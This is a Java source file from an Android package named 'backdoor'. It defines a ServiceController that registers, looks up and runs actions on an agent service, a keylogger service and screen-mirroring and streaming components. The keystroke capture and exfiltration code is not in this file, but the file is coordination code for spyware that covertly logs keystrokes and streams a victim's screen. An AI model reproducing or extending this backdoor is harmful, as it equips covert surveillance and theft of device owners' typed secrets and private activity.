package com.lazyframework.backdoor;


import android.media.projection.MediaProjection;
import android.util.Log;
import java.util.concurrent.atomic.AtomicReference;

public class ServiceController {
    private static final String TAG = "ServiceController";

    private static final AtomicReference<AgentService> agentServiceRef =
            new AtomicReference<>(null);
    private static final AtomicReference<KeyloggerService> keyloggerServiceRef =
            new AtomicReference<>(null);
    private static final AtomicReference<ScreenMirrorHelper> mirrorHelperRef =
            new AtomicReference<>(null);
    private static final AtomicReference<ScreenMirrorService> mirrorServiceRef =
            new AtomicReference<>(null);
    private static final AtomicReference<ScreenStreamHelper> streamHelperRef =
            new AtomicReference<>(null);

    // ==================== SET REFERENCES ====================

    public static void setAgentService(AgentService service) {
        agentServiceRef.set(service);
        if (service != null) {
            Log.d(TAG, "✅ AgentService registered (hash: " + System.identityHashCode(service) + ")");
        } else {
            Log.d(TAG, "⚠️ AgentService unregistered");
        }
        printStatus();
    }

    public static void setKeyloggerService(KeyloggerService service) {
        keyloggerServiceRef.set(service);
        if (service != null) {
            Log.d(TAG, "✅ KeyloggerService registered (hash: " + System.identityHashCode(service) + ")");
        } else {
            Log.d(TAG, "⚠️ KeyloggerService unregistered");
        }
        printStatus();
    }

    public static void setScreenMirrorHelper(ScreenMirrorHelper helper) {
        mirrorHelperRef.set(helper);
        if (helper != null) {
            Log.d(TAG, "✅ ScreenMirrorHelper registered");
        }
    }

    public static void setScreenMirrorService(ScreenMirrorService service) {
        mirrorServiceRef.set(service);
        if (service != null) {
            Log.d(TAG, "✅ ScreenMirrorService registered");
        }
    }

    public static void setScreenStreamHelper(ScreenStreamHelper helper) {
        streamHelperRef.set(helper);
        if (helper != null) {
            Log.d(TAG, "✅ ScreenStreamHelper registered");
        }
    }

    // ==================== GET REFERENCES ====================

    public static AgentService getAgentService() {
        AgentService service = agentServiceRef.get();
        if (service == null) {
            Log.w(TAG, "⚠️ AgentService is NULL");
        } else {
            Log.d(TAG, "📤 AgentService retrieved (hash: " + System.identityHashCode(service) + ")");
        }
        return service;
    }

    public static KeyloggerService getKeyloggerService() {
        KeyloggerService service = keyloggerServiceRef.get();
        if (service == null) {
            Log.w(TAG, "⚠️ KeyloggerService is NULL");
        } else {
            Log.d(TAG, "📤 KeyloggerService retrieved (hash: " + System.identityHashCode(service) + ")");
        }
        return service;
    }

    public static ScreenMirrorHelper getScreenMirrorHelper() {
        return mirrorHelperRef.get();
    }

    public static ScreenMirrorService getScreenMirrorService() {
        return mirrorServiceRef.get();
    }

    public static ScreenStreamHelper getScreenStreamHelper() {
        return streamHelperRef.get();
    }

    // ==================== STATUS ====================
    // ServiceController.java - Tambahkan di bagian GET REFERENCES

public static MediaProjection getMediaProjection() {
    ScreenMirrorService service = mirrorServiceRef.get();
    if (service != null) {
        return ScreenMirrorService.getMediaProjection();
    }
    return null;
}

public static void setMediaProjection(MediaProjection projection) {
    ScreenMirrorService.setMediaProjection(projection);
}

    public static String getDebugInfo() {
        StringBuilder sb = new StringBuilder();
        sb.append("ServiceController Status:\n");
        sb.append("  AgentService: ").append(agentServiceRef.get() != null ? "✅" : "❌");
        if (agentServiceRef.get() != null) {
            sb.append(" (hash: ").append(System.identityHashCode(agentServiceRef.get())).append(")");
        }
        sb.append("\n");
        sb.append("  KeyloggerService: ").append(keyloggerServiceRef.get() != null ? "✅" : "❌");
        if (keyloggerServiceRef.get() != null) {
            sb.append(" (hash: ").append(System.identityHashCode(keyloggerServiceRef.get())).append(")");
        }
        sb.append("\n");
        sb.append("  ScreenMirrorHelper: ").append(mirrorHelperRef.get() != null ? "✅" : "❌").append("\n");
        sb.append("  ScreenMirrorService: ").append(mirrorServiceRef.get() != null ? "✅" : "❌").append("\n");
        sb.append("  ScreenStreamHelper: ").append(streamHelperRef.get() != null ? "✅" : "❌");
        return sb.toString();
    }
    // ServiceController.java - Tambahkan method ini
    public static void printStatus() {
        Log.d(TAG, "=== ServiceController Status ===");
        Log.d(TAG, "  AgentService: " + (agentServiceRef.get() != null ? "✅" : "❌"));
        Log.d(TAG, "  KeyloggerService: " + (keyloggerServiceRef.get() != null ? "✅" : "❌"));
        Log.d(TAG, "  ScreenMirrorHelper: " + (mirrorHelperRef.get() != null ? "✅" : "❌"));
        Log.d(TAG, "  ScreenMirrorService: " + (mirrorServiceRef.get() != null ? "✅" : "❌"));
        Log.d(TAG, "  ScreenStreamHelper: " + (streamHelperRef.get() != null ? "✅" : "❌"));
    }
    // ==================== CLEAR ====================

    public static void clearAll() {
        agentServiceRef.set(null);
        keyloggerServiceRef.set(null);
        mirrorHelperRef.set(null);
        mirrorServiceRef.set(null);
        streamHelperRef.set(null);
        Log.d(TAG, "✅ All references cleared");
    }

    public static void clearAgentService() {
        agentServiceRef.set(null);
        Log.d(TAG, "✅ AgentService cleared");
    }

    public static void clearKeyloggerService() {
        keyloggerServiceRef.set(null);
        Log.d(TAG, "✅ KeyloggerService cleared");
    }

    public static void clearMirrorHelper() {
        mirrorHelperRef.set(null);
    }

    public static void clearMirrorService() {
        mirrorServiceRef.set(null);
    }

    public static void clearStreamHelper() {
        streamHelperRef.set(null);
    }

    public static boolean isAgentServiceAvailable() {
        return agentServiceRef.get() != null;
    }

    public static boolean isKeyloggerServiceAvailable() {
        return keyloggerServiceRef.get() != null;
    }

    public static boolean isMirrorHelperAvailable() {
        return mirrorHelperRef.get() != null;
    }

    public static boolean isMirrorServiceAvailable() {
        return mirrorServiceRef.get() != null;
    }

    public static boolean isStreamHelperAvailable() {
        return streamHelperRef.get() != null;
    }

    // ==================== EXECUTE ACTIONS ====================

    public interface AgentServiceAction {
        void execute(AgentService service) throws Exception;
    }

    public interface KeyloggerAction {
        void execute(KeyloggerService service) throws Exception;
    }

    public interface StreamHelperAction {
        void execute(ScreenStreamHelper helper) throws Exception;
    }

    public static void executeOnAgentService(AgentServiceAction action) {
        AgentService service = getAgentService();
        if (service != null) {
            try {
                action.execute(service);
            } catch (Exception e) {
                Log.e(TAG, "Action error: " + e.getMessage());
            }
        }
    }

    public static void executeOnKeylogger(KeyloggerAction action) {
        KeyloggerService service = getKeyloggerService();
        if (service != null) {
            try {
                action.execute(service);
            } catch (Exception e) {
                Log.e(TAG, "Keylogger action error: " + e.getMessage());
            }
        }
    }

    public static void executeOnStreamHelper(StreamHelperAction action) {
        ScreenStreamHelper helper = getScreenStreamHelper();
        if (helper != null) {
            try {
                action.execute(helper);
            } catch (Exception e) {
                Log.e(TAG, "Stream helper action error: " + e.getMessage());
            }
        }
    }
}
